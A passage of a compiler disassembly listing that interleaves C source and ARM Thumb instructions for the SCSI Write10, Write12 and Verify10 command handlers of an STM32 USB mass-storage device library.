 800a74e:	607a      	str	r2, [r7, #4]
 800a750:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a752:	68fb      	ldr	r3, [r7, #12]
 800a754:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a758:	68fb      	ldr	r3, [r7, #12]
 800a75a:	32b0      	adds	r2, #176	; 0xb0
 800a75c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a760:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a762:	697b      	ldr	r3, [r7, #20]
 800a764:	2b00      	cmp	r3, #0
 800a766:	d102      	bne.n	800a76e <SCSI_Write10+0x2a>
  {
    return -1;
 800a768:	f04f 33ff 	mov.w	r3, #4294967295
 800a76c:	e0c7      	b.n	800a8fe <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a76e:	697b      	ldr	r3, [r7, #20]
 800a770:	7a1b      	ldrb	r3, [r3, #8]
 800a772:	2b00      	cmp	r3, #0
 800a774:	f040 80bd 	bne.w	800a8f2 <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a778:	697b      	ldr	r3, [r7, #20]
 800a77a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a77e:	699b      	ldr	r3, [r3, #24]
 800a780:	2b00      	cmp	r3, #0
 800a782:	d10b      	bne.n	800a79c <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a784:	697b      	ldr	r3, [r7, #20]
 800a786:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a78a:	7f59      	ldrb	r1, [r3, #29]
 800a78c:	2320      	movs	r3, #32
 800a78e:	2205      	movs	r2, #5
 800a790:	68f8      	ldr	r0, [r7, #12]
 800a792:	f7ff fd75 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a796:	f04f 33ff 	mov.w	r3, #4294967295
 800a79a:	e0b0      	b.n	800a8fe <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a79c:	697b      	ldr	r3, [r7, #20]
 800a79e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7a2:	7f1b      	ldrb	r3, [r3, #28]
 800a7a4:	b25b      	sxtb	r3, r3
 800a7a6:	2b00      	cmp	r3, #0
 800a7a8:	da0b      	bge.n	800a7c2 <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a7aa:	697b      	ldr	r3, [r7, #20]
 800a7ac:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a7b0:	7f59      	ldrb	r1, [r3, #29]
 800a7b2:	2320      	movs	r3, #32
 800a7b4:	2205      	movs	r2, #5
 800a7b6:	68f8      	ldr	r0, [r7, #12]
 800a7b8:	f7ff fd62 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a7bc:	f04f 33ff 	mov.w	r3, #4294967295
 800a7c0:	e09d      	b.n	800a8fe <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a7c2:	68fb      	ldr	r3, [r7, #12]
 800a7c4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a7c8:	68fa      	ldr	r2, [r7, #12]
 800a7ca:	33b0      	adds	r3, #176	; 0xb0
 800a7cc:	009b      	lsls	r3, r3, #2
 800a7ce:	4413      	add	r3, r2
 800a7d0:	685b      	ldr	r3, [r3, #4]
 800a7d2:	689b      	ldr	r3, [r3, #8]
 800a7d4:	7afa      	ldrb	r2, [r7, #11]
 800a7d6:	4610      	mov	r0, r2
 800a7d8:	4798      	blx	r3
 800a7da:	4603      	mov	r3, r0
 800a7dc:	2b00      	cmp	r3, #0
 800a7de:	d008      	beq.n	800a7f2 <SCSI_Write10+0xae>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a7e0:	7af9      	ldrb	r1, [r7, #11]
 800a7e2:	233a      	movs	r3, #58	; 0x3a
 800a7e4:	2202      	movs	r2, #2
 800a7e6:	68f8      	ldr	r0, [r7, #12]
 800a7e8:	f7ff fd4a 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a7ec:	f04f 33ff 	mov.w	r3, #4294967295
 800a7f0:	e085      	b.n	800a8fe <SCSI_Write10+0x1ba>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a7f2:	68fb      	ldr	r3, [r7, #12]
 800a7f4:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a7f8:	68fa      	ldr	r2, [r7, #12]
 800a7fa:	33b0      	adds	r3, #176	; 0xb0
 800a7fc:	009b      	lsls	r3, r3, #2
 800a7fe:	4413      	add	r3, r2
 800a800:	685b      	ldr	r3, [r3, #4]
 800a802:	68db      	ldr	r3, [r3, #12]
 800a804:	7afa      	ldrb	r2, [r7, #11]
 800a806:	4610      	mov	r0, r2
 800a808:	4798      	blx	r3
 800a80a:	4603      	mov	r3, r0
 800a80c:	2b00      	cmp	r3, #0
 800a80e:	d008      	beq.n	800a822 <SCSI_Write10+0xde>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a810:	7af9      	ldrb	r1, [r7, #11]
 800a812:	2327      	movs	r3, #39	; 0x27
 800a814:	2202      	movs	r2, #2
 800a816:	68f8      	ldr	r0, [r7, #12]
 800a818:	f7ff fd32 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a81c:	f04f 33ff 	mov.w	r3, #4294967295
 800a820:	e06d      	b.n	800a8fe <SCSI_Write10+0x1ba>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a822:	687b      	ldr	r3, [r7, #4]
 800a824:	3302      	adds	r3, #2
 800a826:	781b      	ldrb	r3, [r3, #0]
 800a828:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a82a:	687b      	ldr	r3, [r7, #4]
 800a82c:	3303      	adds	r3, #3
 800a82e:	781b      	ldrb	r3, [r3, #0]
 800a830:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a832:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800a834:	687b      	ldr	r3, [r7, #4]
 800a836:	3304      	adds	r3, #4
 800a838:	781b      	ldrb	r3, [r3, #0]
 800a83a:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a83c:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a83e:	687a      	ldr	r2, [r7, #4]
 800a840:	3205      	adds	r2, #5
 800a842:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800a844:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a846:	697a      	ldr	r2, [r7, #20]
 800a848:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a84c:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a84e:	687b      	ldr	r3, [r7, #4]
 800a850:	3307      	adds	r3, #7
 800a852:	781b      	ldrb	r3, [r3, #0]
 800a854:	021b      	lsls	r3, r3, #8
                         (uint32_t)params[8];
 800a856:	687a      	ldr	r2, [r7, #4]
 800a858:	3208      	adds	r2, #8
 800a85a:	7812      	ldrb	r2, [r2, #0]
    hmsc->scsi_blk_len = ((uint32_t)params[7] << 8) |
 800a85c:	4313      	orrs	r3, r2
 800a85e:	697a      	ldr	r2, [r7, #20]
 800a860:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a864:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a866:	697b      	ldr	r3, [r7, #20]
 800a868:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a86c:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a86e:	697b      	ldr	r3, [r7, #20]
 800a870:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a874:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a876:	7af9      	ldrb	r1, [r7, #11]
 800a878:	68f8      	ldr	r0, [r7, #12]
 800a87a:	f000 f97a 	bl	800ab72 <SCSI_CheckAddressRange>
 800a87e:	4603      	mov	r3, r0
 800a880:	2b00      	cmp	r3, #0
 800a882:	da02      	bge.n	800a88a <SCSI_Write10+0x146>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a884:	f04f 33ff 	mov.w	r3, #4294967295
 800a888:	e039      	b.n	800a8fe <SCSI_Write10+0x1ba>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800a88a:	697b      	ldr	r3, [r7, #20]
 800a88c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a890:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a892:	697a      	ldr	r2, [r7, #20]
 800a894:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a898:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800a89c:	fb02 f303 	mul.w	r3, r2, r3
 800a8a0:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800a8a2:	697b      	ldr	r3, [r7, #20]
 800a8a4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8a8:	699b      	ldr	r3, [r3, #24]
 800a8aa:	693a      	ldr	r2, [r7, #16]
 800a8ac:	429a      	cmp	r2, r3
 800a8ae:	d00b      	beq.n	800a8c8 <SCSI_Write10+0x184>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a8b0:	697b      	ldr	r3, [r7, #20]
 800a8b2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a8b6:	7f59      	ldrb	r1, [r3, #29]
 800a8b8:	2320      	movs	r3, #32
 800a8ba:	2205      	movs	r2, #5
 800a8bc:	68f8      	ldr	r0, [r7, #12]
 800a8be:	f7ff fcdf 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a8c2:	f04f 33ff 	mov.w	r3, #4294967295
 800a8c6:	e01a      	b.n	800a8fe <SCSI_Write10+0x1ba>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800a8c8:	693b      	ldr	r3, [r7, #16]
 800a8ca:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800a8ce:	bf28      	it	cs
 800a8d0:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800a8d4:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800a8d6:	697b      	ldr	r3, [r7, #20]
 800a8d8:	2201      	movs	r2, #1
 800a8da:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800a8dc:	4b0a      	ldr	r3, [pc, #40]	; (800a908 <SCSI_Write10+0x1c4>)
 800a8de:	7819      	ldrb	r1, [r3, #0]
 800a8e0:	697b      	ldr	r3, [r7, #20]
 800a8e2:	f103 0210 	add.w	r2, r3, #16
 800a8e6:	693b      	ldr	r3, [r7, #16]
 800a8e8:	68f8      	ldr	r0, [r7, #12]
 800a8ea:	f002 faf3 	bl	800ced4 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800a8ee:	2300      	movs	r3, #0
 800a8f0:	e005      	b.n	800a8fe <SCSI_Write10+0x1ba>
    return SCSI_ProcessWrite(pdev, lun);
 800a8f2:	7afb      	ldrb	r3, [r7, #11]
 800a8f4:	4619      	mov	r1, r3
 800a8f6:	68f8      	ldr	r0, [r7, #12]
 800a8f8:	f000 f9fe 	bl	800acf8 <SCSI_ProcessWrite>
 800a8fc:	4603      	mov	r3, r0
}
 800a8fe:	4618      	mov	r0, r3
 800a900:	3718      	adds	r7, #24
 800a902:	46bd      	mov	sp, r7
 800a904:	bd80      	pop	{r7, pc}
 800a906:	bf00      	nop
 800a908:	2000010b 	.word	0x2000010b

0800a90c <SCSI_Write12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a90c:	b580      	push	{r7, lr}
 800a90e:	b086      	sub	sp, #24
 800a910:	af00      	add	r7, sp, #0
 800a912:	60f8      	str	r0, [r7, #12]
 800a914:	460b      	mov	r3, r1
 800a916:	607a      	str	r2, [r7, #4]
 800a918:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a91a:	68fb      	ldr	r3, [r7, #12]
 800a91c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a920:	68fb      	ldr	r3, [r7, #12]
 800a922:	32b0      	adds	r2, #176	; 0xb0
 800a924:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a928:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a92a:	697b      	ldr	r3, [r7, #20]
 800a92c:	2b00      	cmp	r3, #0
 800a92e:	d102      	bne.n	800a936 <SCSI_Write12+0x2a>
  {
    return -1;
 800a930:	f04f 33ff 	mov.w	r3, #4294967295
 800a934:	e0d7      	b.n	800aae6 <SCSI_Write12+0x1da>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a936:	697b      	ldr	r3, [r7, #20]
 800a938:	7a1b      	ldrb	r3, [r3, #8]
 800a93a:	2b00      	cmp	r3, #0
 800a93c:	f040 80cd 	bne.w	800aada <SCSI_Write12+0x1ce>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a940:	697b      	ldr	r3, [r7, #20]
 800a942:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a946:	699b      	ldr	r3, [r3, #24]
 800a948:	2b00      	cmp	r3, #0
 800a94a:	d10b      	bne.n	800a964 <SCSI_Write12+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a94c:	697b      	ldr	r3, [r7, #20]
 800a94e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a952:	7f59      	ldrb	r1, [r3, #29]
 800a954:	2320      	movs	r3, #32
 800a956:	2205      	movs	r2, #5
 800a958:	68f8      	ldr	r0, [r7, #12]
 800a95a:	f7ff fc91 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a95e:	f04f 33ff 	mov.w	r3, #4294967295
 800a962:	e0c0      	b.n	800aae6 <SCSI_Write12+0x1da>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a964:	697b      	ldr	r3, [r7, #20]
 800a966:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a96a:	7f1b      	ldrb	r3, [r3, #28]
 800a96c:	b25b      	sxtb	r3, r3
 800a96e:	2b00      	cmp	r3, #0
 800a970:	da0b      	bge.n	800a98a <SCSI_Write12+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a972:	697b      	ldr	r3, [r7, #20]
 800a974:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a978:	7f59      	ldrb	r1, [r3, #29]
 800a97a:	2320      	movs	r3, #32
 800a97c:	2205      	movs	r2, #5
 800a97e:	68f8      	ldr	r0, [r7, #12]
 800a980:	f7ff fc7e 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800a984:	f04f 33ff 	mov.w	r3, #4294967295
 800a988:	e0ad      	b.n	800aae6 <SCSI_Write12+0x1da>
    }

    /* Check whether Media is ready */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a98a:	68fb      	ldr	r3, [r7, #12]
 800a98c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a990:	68fa      	ldr	r2, [r7, #12]
 800a992:	33b0      	adds	r3, #176	; 0xb0
 800a994:	009b      	lsls	r3, r3, #2
 800a996:	4413      	add	r3, r2
 800a998:	685b      	ldr	r3, [r3, #4]
 800a99a:	689b      	ldr	r3, [r3, #8]
 800a99c:	7afa      	ldrb	r2, [r7, #11]
 800a99e:	4610      	mov	r0, r2
 800a9a0:	4798      	blx	r3
 800a9a2:	4603      	mov	r3, r0
 800a9a4:	2b00      	cmp	r3, #0
 800a9a6:	d00b      	beq.n	800a9c0 <SCSI_Write12+0xb4>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a9a8:	7af9      	ldrb	r1, [r7, #11]
 800a9aa:	233a      	movs	r3, #58	; 0x3a
 800a9ac:	2202      	movs	r2, #2
 800a9ae:	68f8      	ldr	r0, [r7, #12]
 800a9b0:	f7ff fc66 	bl	800a280 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a9b4:	697b      	ldr	r3, [r7, #20]
 800a9b6:	2205      	movs	r2, #5
 800a9b8:	721a      	strb	r2, [r3, #8]
      return -1;
 800a9ba:	f04f 33ff 	mov.w	r3, #4294967295
 800a9be:	e092      	b.n	800aae6 <SCSI_Write12+0x1da>
    }

    /* Check If media is write-protected */
    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsWriteProtected(lun) != 0)
 800a9c0:	68fb      	ldr	r3, [r7, #12]
 800a9c2:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a9c6:	68fa      	ldr	r2, [r7, #12]
 800a9c8:	33b0      	adds	r3, #176	; 0xb0
 800a9ca:	009b      	lsls	r3, r3, #2
 800a9cc:	4413      	add	r3, r2
 800a9ce:	685b      	ldr	r3, [r3, #4]
 800a9d0:	68db      	ldr	r3, [r3, #12]
 800a9d2:	7afa      	ldrb	r2, [r7, #11]
 800a9d4:	4610      	mov	r0, r2
 800a9d6:	4798      	blx	r3
 800a9d8:	4603      	mov	r3, r0
 800a9da:	2b00      	cmp	r3, #0
 800a9dc:	d00b      	beq.n	800a9f6 <SCSI_Write12+0xea>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, WRITE_PROTECTED);
 800a9de:	7af9      	ldrb	r1, [r7, #11]
 800a9e0:	2327      	movs	r3, #39	; 0x27
 800a9e2:	2202      	movs	r2, #2
 800a9e4:	68f8      	ldr	r0, [r7, #12]
 800a9e6:	f7ff fc4b 	bl	800a280 <SCSI_SenseCode>
      hmsc->bot_state = USBD_BOT_NO_DATA;
 800a9ea:	697b      	ldr	r3, [r7, #20]
 800a9ec:	2205      	movs	r2, #5
 800a9ee:	721a      	strb	r2, [r3, #8]
      return -1;
 800a9f0:	f04f 33ff 	mov.w	r3, #4294967295
 800a9f4:	e077      	b.n	800aae6 <SCSI_Write12+0x1da>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a9f6:	687b      	ldr	r3, [r7, #4]
 800a9f8:	3302      	adds	r3, #2
 800a9fa:	781b      	ldrb	r3, [r3, #0]
 800a9fc:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a9fe:	687b      	ldr	r3, [r7, #4]
 800aa00:	3303      	adds	r3, #3
 800aa02:	781b      	ldrb	r3, [r3, #0]
 800aa04:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa06:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] << 8) |
 800aa08:	687b      	ldr	r3, [r7, #4]
 800aa0a:	3304      	adds	r3, #4
 800aa0c:	781b      	ldrb	r3, [r3, #0]
 800aa0e:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800aa10:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800aa12:	687a      	ldr	r2, [r7, #4]
 800aa14:	3205      	adds	r2, #5
 800aa16:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] << 8) |
 800aa18:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800aa1a:	697a      	ldr	r2, [r7, #20]
 800aa1c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa20:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800aa22:	687b      	ldr	r3, [r7, #4]
 800aa24:	3306      	adds	r3, #6
 800aa26:	781b      	ldrb	r3, [r3, #0]
 800aa28:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800aa2a:	687b      	ldr	r3, [r7, #4]
 800aa2c:	3307      	adds	r3, #7
 800aa2e:	781b      	ldrb	r3, [r3, #0]
 800aa30:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800aa32:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800aa34:	687b      	ldr	r3, [r7, #4]
 800aa36:	3308      	adds	r3, #8
 800aa38:	781b      	ldrb	r3, [r3, #0]
 800aa3a:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800aa3c:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800aa3e:	687a      	ldr	r2, [r7, #4]
 800aa40:	3209      	adds	r2, #9
 800aa42:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800aa44:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800aa46:	697a      	ldr	r2, [r7, #20]
 800aa48:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa4c:	6713      	str	r3, [r2, #112]	; 0x70

    /* check if LBA address is in the right range */
    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800aa4e:	697b      	ldr	r3, [r7, #20]
 800aa50:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa54:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800aa56:	697b      	ldr	r3, [r7, #20]
 800aa58:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa5c:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa5e:	7af9      	ldrb	r1, [r7, #11]
 800aa60:	68f8      	ldr	r0, [r7, #12]
 800aa62:	f000 f886 	bl	800ab72 <SCSI_CheckAddressRange>
 800aa66:	4603      	mov	r3, r0
 800aa68:	2b00      	cmp	r3, #0
 800aa6a:	da02      	bge.n	800aa72 <SCSI_Write12+0x166>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800aa6c:	f04f 33ff 	mov.w	r3, #4294967295
 800aa70:	e039      	b.n	800aae6 <SCSI_Write12+0x1da>
    }

    len = hmsc->scsi_blk_len * hmsc->scsi_blk_size;
 800aa72:	697b      	ldr	r3, [r7, #20]
 800aa74:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa78:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800aa7a:	697a      	ldr	r2, [r7, #20]
 800aa7c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800aa80:	f8b2 2064 	ldrh.w	r2, [r2, #100]	; 0x64
 800aa84:	fb02 f303 	mul.w	r3, r2, r3
 800aa88:	613b      	str	r3, [r7, #16]

    /* cases 3,11,13 : Hn,Ho <> D0 */
    if (hmsc->cbw.dDataLength != len)
 800aa8a:	697b      	ldr	r3, [r7, #20]
 800aa8c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa90:	699b      	ldr	r3, [r3, #24]
 800aa92:	693a      	ldr	r2, [r7, #16]
 800aa94:	429a      	cmp	r2, r3
 800aa96:	d00b      	beq.n	800aab0 <SCSI_Write12+0x1a4>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800aa98:	697b      	ldr	r3, [r7, #20]
 800aa9a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800aa9e:	7f59      	ldrb	r1, [r3, #29]
 800aaa0:	2320      	movs	r3, #32
 800aaa2:	2205      	movs	r2, #5
 800aaa4:	68f8      	ldr	r0, [r7, #12]
 800aaa6:	f7ff fbeb 	bl	800a280 <SCSI_SenseCode>
      return -1;
 800aaaa:	f04f 33ff 	mov.w	r3, #4294967295
 800aaae:	e01a      	b.n	800aae6 <SCSI_Write12+0x1da>
    }

    len = MIN(len, MSC_MEDIA_PACKET);
 800aab0:	693b      	ldr	r3, [r7, #16]
 800aab2:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800aab6:	bf28      	it	cs
 800aab8:	f44f 5380 	movcs.w	r3, #4096	; 0x1000
 800aabc:	613b      	str	r3, [r7, #16]

    /* Prepare EP to receive first data packet */
    hmsc->bot_state = USBD_BOT_DATA_OUT;
 800aabe:	697b      	ldr	r3, [r7, #20]
 800aac0:	2201      	movs	r2, #1
 800aac2:	721a      	strb	r2, [r3, #8]
    (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, hmsc->bot_data, len);
 800aac4:	4b0a      	ldr	r3, [pc, #40]	; (800aaf0 <SCSI_Write12+0x1e4>)
 800aac6:	7819      	ldrb	r1, [r3, #0]
 800aac8:	697b      	ldr	r3, [r7, #20]
 800aaca:	f103 0210 	add.w	r2, r3, #16
 800aace:	693b      	ldr	r3, [r7, #16]
 800aad0:	68f8      	ldr	r0, [r7, #12]
 800aad2:	f002 f9ff 	bl	800ced4 <USBD_LL_PrepareReceive>
  else /* Write Process ongoing */
  {
    return SCSI_ProcessWrite(pdev, lun);
  }

  return 0;
 800aad6:	2300      	movs	r3, #0
 800aad8:	e005      	b.n	800aae6 <SCSI_Write12+0x1da>
    return SCSI_ProcessWrite(pdev, lun);
 800aada:	7afb      	ldrb	r3, [r7, #11]
 800aadc:	4619      	mov	r1, r3
 800aade:	68f8      	ldr	r0, [r7, #12]
 800aae0:	f000 f90a 	bl	800acf8 <SCSI_ProcessWrite>
 800aae4:	4603      	mov	r3, r0
}
 800aae6:	4618      	mov	r0, r3
 800aae8:	3718      	adds	r7, #24
 800aaea:	46bd      	mov	sp, r7
 800aaec:	bd80      	pop	{r7, pc}
 800aaee:	bf00      	nop
 800aaf0:	2000010b 	.word	0x2000010b

0800aaf4 <SCSI_Verify10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Verify10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800aaf4:	b580      	push	{r7, lr}
 800aaf6:	b086      	sub	sp, #24
 800aaf8:	af00      	add	r7, sp, #0
 800aafa:	60f8      	str	r0, [r7, #12]
 800aafc:	460b      	mov	r3, r1
 800aafe:	607a      	str	r2, [r7, #4]
 800ab00:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800ab02:	68fb      	ldr	r3, [r7, #12]
 800ab04:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800ab08:	68fb      	ldr	r3, [r7, #12]
 800ab0a:	32b0      	adds	r2, #176	; 0xb0
 800ab0c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ab10:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800ab12:	697b      	ldr	r3, [r7, #20]
 800ab14:	2b00      	cmp	r3, #0
 800ab16:	d102      	bne.n	800ab1e <SCSI_Verify10+0x2a>
  {
    return -1;
 800ab18:	f04f 33ff 	mov.w	r3, #4294967295
 800ab1c:	e025      	b.n	800ab6a <SCSI_Verify10+0x76>
  }

  if ((params[1] & 0x02U) == 0x02U)
 800ab1e:	687b      	ldr	r3, [r7, #4]
 800ab20:	3301      	adds	r3, #1
 800ab22:	781b      	ldrb	r3, [r3, #0]
 800ab24:	f003 0302 	and.w	r3, r3, #2
 800ab28:	2b00      	cmp	r3, #0
 800ab2a:	d008      	beq.n	800ab3e <SCSI_Verify10+0x4a>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800ab2c:	7af9      	ldrb	r1, [r7, #11]
 800ab2e:	2324      	movs	r3, #36	; 0x24
 800ab30:	2205      	movs	r2, #5
 800ab32:	68f8      	ldr	r0, [r7, #12]
